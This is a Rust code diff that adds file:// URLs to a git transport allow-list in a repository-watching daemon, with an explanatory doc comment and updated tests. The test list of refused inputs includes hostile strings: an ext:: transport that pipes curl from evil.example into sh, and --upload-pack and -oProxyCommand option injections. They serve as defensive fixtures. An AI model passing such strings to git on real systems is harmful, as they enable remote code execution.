@@ -327,9 +327,16 @@ impl GitWatch {
 /// - A URL beginning with `-` is read as an option rather than as a repository,
 ///   which lets `--upload-pack=<command>` do the same thing.
 ///
-/// So the transports are an allow-list. Anything outside it is refused with the
-/// list in the message, rather than being rewritten into something that happens
-/// to be safe.
+/// So the transports are an allow-list: `https://`, `http://`, `ssh://`,
+/// `git://`, `file://`, and the scp-like `user@host:owner/repo` form. `file://`
+/// joined the list on 2026-09-28 (owner decision, report-ac46a57c) — unlike
+/// `ext::`, it names no program at all. `git` runs its own local `upload-pack`
+/// against the given path in-process; there is no argument position for a
+/// command to hide in, so it cannot be turned into arbitrary code execution the
+/// way `ext::` can. A bare path with no scheme (`/srv/repos/local.git`) stays
+/// refused — only an explicit `file://` URL is accepted. Anything outside this
+/// list is refused with the list in the message, rather than being rewritten
+/// into something that happens to be safe.
 fn repository_problem(repository: &str) -> Option<String> {
     let repository = repository.trim();
     if repository.is_empty() {
@@ -349,6 +356,12 @@ fn repository_problem(repository: &str) -> Option<String> {
     if permitted.iter().any(|scheme| repository.starts_with(scheme)) {
         return None;
     }
+    if let Some(path) = repository.strip_prefix("file://") {
+        if !path.is_empty() {
+            return None;
+        }
+        return Some(format!("\"{repository}\" is a file:// URL with no path after it"));
+    }
     // The scp-like form git accepts for SSH: user@host:owner/repo.git. Checked by
     // shape rather than by scheme because it has none.
     if let Some((before, after)) = repository.split_once(':')
@@ -361,7 +374,7 @@ fn repository_problem(repository: &str) -> Option<String> {
     }
     Some(format!(
         "\"{repository}\" does not use a transport this daemon will run. Use https://, \
-         ssh://, git://, or the user@host:owner/repo form — git's ext:: transport runs \
+         ssh://, git://, file://, or the user@host:owner/repo form — git's ext:: transport runs \
          a command of its own, which a service definition is not allowed to do"
     ))
 }
@@ -470,12 +483,17 @@ mod tests {
         // git's ext:: transport runs its argument as the transport program, and a
         // URL starting with a dash reaches git as an option. Either one turns a
         // service definition posted to the control API into code execution.
+        // A bare local path with no scheme stays refused too — only an explicit
+        // `file://` URL is on the allow-list, and even that is refused with no
+        // path after it.
         for bad in [
+            "ext::sh -c x",
             "ext::sh -c 'curl evil.example/x | sh'",
             "--upload-pack=/tmp/evil",
             "-oProxyCommand=evil",
+            "-x",
             "/srv/repos/local.git",
-            "file:///srv/repos/local.git",
+            "file://",
         ] {
             let watch = GitWatch::new(bad, "site");
             assert!(
@@ -493,6 +511,10 @@ mod tests {
             "ssh://git@github.com/owner/repo.git",
             "git://example.com/repo.git",
             "git@github.com:owner/repo.git",
+            // file:// runs git's own local upload-pack against the path, not an
+            // arbitrary command — see repository_problem's doc comment.
+            "file:///P:/onebit/git/onebit-core.git",
+            "file:///Users/x/repo.git",
         ] {
             let watch = GitWatch::new(good, "site");
             assert!(problems_of(&watch).is_empty(), "refused {good:?}");
